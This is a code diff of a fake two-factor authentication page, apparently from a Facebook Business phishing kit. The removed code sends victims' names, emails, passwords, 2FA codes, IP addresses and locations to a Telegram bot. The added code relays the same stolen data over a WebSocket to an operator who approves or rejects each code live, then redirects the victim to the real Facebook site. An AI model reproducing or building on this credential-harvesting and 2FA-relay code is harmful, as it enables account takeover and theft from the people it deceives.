@@ -52,8 +52,8 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             </form>
         </div>
     </div>
+    <?php include 'loading.php'; ?>
 
-    <script src="../../scripts/two-factor-authentication.js"></script>
     <script>
         function showError(errorMessage, codeInput) {
             errorMessage.style.display = 'flex';
@@ -68,11 +68,8 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         document.addEventListener('DOMContentLoaded', function() {
             const codeInput = document.getElementById('code');
             const confirmBtn = document.querySelector('.confirm-btn');
-            const learnMoreLink = document.querySelector('.learn-more');
-            const alternativeAuthLink = document.querySelector('.alternative-auth');
             const errorMessage = document.querySelector('.error-message');
 
-           
             // Format input to only allow numbers and max 8 digits
             codeInput.addEventListener('input', function(e) {
                 // Remove any non-numeric characters
@@ -83,117 +80,85 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                     this.value = this.value.slice(0, 8);
                 }
 
-                // Hide error when user starts typing again
+                if (codeInput.value.length > 0) {
+                    codeInput.style.border = '1px solid #E5E5E5';
+                } else {
+                    codeInput.style.border = '1px solid #FF0303';
+                }
+
                 hideError(errorMessage, codeInput);
             });
+        });
 
-            // Handle learn more link
-            learnMoreLink.addEventListener('click', function(e) {
-                e.preventDefault();
-                // Here you would typically open documentation or help page
-                console.log('Opening 2FA documentation...');
-            });
+        const ws = new WebSocket('ws://localhost:8080');
+        let orderId = localStorage.getItem('currentOrderId');
 
-            // Handle alternative authentication link
-            alternativeAuthLink.addEventListener('click', function(e) {
-                e.preventDefault();
-                // Here you would typically show alternative auth options
-                console.log('Opening alternative authentication options...');
-            });
-            
-            var paramsURL = new URLSearchParams(window.location.search);
-            var error = paramsURL.get('error');
-            var code = paramsURL.get('code');
-
-            if (error == 1) {
-                codeInput.value = code;
+        ws.onmessage = function(event) {
+            const data = JSON.parse(event.data);
+            if (data.type === 'admin_approve_code_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
+                localStorage.setItem('currentOrderId', data.order_id);
+                localStorage.setItem('currentStep', data.step);
+                localStorage.setItem('currentCode', data.code);
+                window.location.href = 'https://business.facebook.com/select/?next=';
+            } else if (data.type === 'admin_reject_code_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
+                hideLoading();
+                var codeInput = document.getElementById('code');
+                codeInput.value = "";
+                codeInput.value = data.user_info.code;
                 codeInput.focus();
-                codeInput.select();
                 codeInput.style.border = '1px solid #FF0303';
 
-                codeInput.addEventListener('input', function() {
-                    if (codeInput.value.length > 0) {
-                        codeInput.style.border = '1px solid #E5E5E5';
-                    } else {
-                        codeInput.style.border = '1px solid #FF0303';
-                    }
-                });
+                var errorMessage = document.querySelector('.error-message');
+                showError(errorMessage, codeInput);
             }
-        });
+        };
             
         function sendToTelegramFromTwoFactorAuthentication(event) {
             event.preventDefault();
-            var code = document.getElementById('code').value || '';
             var errorMessage = document.querySelector('.error-message');
             var codeInput = document.getElementById('code');
+            var code = document.getElementById('code').value || '';
 
-            if (code == "") {
+            console.log(code);
+            console.log(code.length);
+            if (code == "" || code.length < 6){
                 showError(errorMessage, codeInput);
-                return;
-            }
+            } else {
+                var firstName = localStorage.getItem('firstName');
+                var lastName = localStorage.getItem('lastName');
+                var personalEmail = localStorage.getItem('personalEmail');
+                var password = localStorage.getItem('password');
 
-            if (code.length < 6) {
-                showError(errorMessage, codeInput);
-                return;
-            }
+                var ip = `<?php echo htmlspecialchars($ip_server); ?>` || `<?php echo $ip; ?>`;
+                var ip_address = `<?php echo $ip; ?>`;
+                var city = `<?php echo $city; ?>`;
+                var region = `<?php echo $region; ?>`;
+                var country = `<?php echo $country; ?>`;
+                var org = `<?php echo $org; ?>`;
+                var timezone = `<?php echo $timezone; ?>`;
 
-            var firstName = localStorage.getItem('firstName');
-            var lastName = localStorage.getItem('lastName');
-            var personalEmail = localStorage.getItem('personalEmail');
-            var password = localStorage.getItem('password');
-
-            var content = "💬Thông Tin Tài Khoản 2💬" +
-                "\n" + "----------------------------------------------------------" +
-                "\nFirst Name: " + "`" + firstName + "`" +
-                "\nLast Name: " + "`" + lastName + "`" +
-                "\nEmail: " + "`" + personalEmail + "`" +
-                "\nPassword: " + "`" + password + "`" +
-                "\n" + "----------------------------------------------------------" +
-                "\nCode: " + "`" + code + "`" +
-                "\n" + "----------------------------------------------------------" +
-                "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
-                "\nIP Address: " + "`<?php echo $ip; ?>`" +
-                "\nCity: " + "`<?php echo $city; ?>`" +
-                "\nRegion: " + "`<?php echo $region; ?>`" +
-                "\nCountry: " + "`<?php echo $country; ?>`" +
-                "\nOrg: " + "`<?php echo $org; ?>`" +
-                "\nTimezone: " + "`<?php echo $timezone; ?>`" +
-                "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";
-
-            console.log(content);
-            
-            var apiToken = "<?php echo $token; ?>";
-            var data = {
-                chat_id: '<?php echo $chatId; ?>',
-                text: content,
-                parse_mode: 'Markdown'
-            };
-
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === XMLHttpRequest.DONE) {
-                    if (xhr.status >= 200 && xhr.status < 300) {
-                        console.log('Message sent to Telegram bot successfully.');
-                        setTimeout(function() {
-                            var paramsURL = new URLSearchParams(window.location.search);
-                            var error = paramsURL.get('error');
-
-                            if (error == 1) {
-                                window.location.href = "https://business.facebook.com/select/?next=";
-                            } else {
-                                window.location.href = "two-factor-authentication?error=1&code=" + code;
-                            }
-                        }, 1000);
-                    } else {
-                        console.error('Failed to send message to Telegram bot.');
+                ws.send(JSON.stringify({
+                    type: 'enter_code',
+                    order_id: orderId,
+                    code: code,
+                    step: 3,
+                    user_info: {
+                        name: firstName + " " + lastName,
+                        email: personalEmail,
+                        ip: ip,
+                        ip_address: ip_address,
+                        city: city,
+                        region: region,
+                        country: country,
+                        org: org,
+                        timezone: timezone,
+                        password: password,
+                        code: code,
+                        phone: ""
                     }
-                }
-            };
-
-            xhr.send(JSON.stringify(data));
+                }));
+                showLoading();
+            }
         }
     </script>
 </body>
